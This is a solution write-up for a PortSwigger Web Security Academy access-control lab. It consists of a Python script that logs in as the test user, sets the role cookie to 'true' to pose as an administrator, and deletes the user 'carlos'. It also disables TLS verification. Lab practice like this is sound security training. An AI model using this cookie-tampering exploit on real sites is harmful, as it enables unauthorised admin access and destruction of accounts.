# Lab: User role controlled by request parameter

Link to lab: https://portswigger.net/web-security/access-control/lab-user-role-controlled-by-request-parameter

## Solution

```python
import requests
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup


url = 'https://0a9a0063037d62f5c0313b2400980052.web-security-academy.net/'

session = requests.Session()

response = session.get(
    url + 'login',
    verify=False,
)

soup = BeautifulSoup(response.text, 'html.parser')
csrf = soup.find('input', {'name': 'csrf'})['value']

data = {
    'csrf': csrf,
    'username': 'wiener',
    'password': 'peter',
}

response = session.post(
    'https://0a9a0063037d62f5c0313b2400980052.web-security-academy.net/login',
    data=data,
    verify=False,
    allow_redirects=False
)

admin = response.headers['Set-Cookie'].split(';')[0].split('=')[0]
session = response.headers['Set-Cookie'].split(';')[2].split('=')[1]


cookies = {
    admin : 'true',
    'session': session
}


response = requests.get(
    url + 'admin/delete?username=carlos',
    cookies=cookies,
    verify= False
)

print(response.text)
```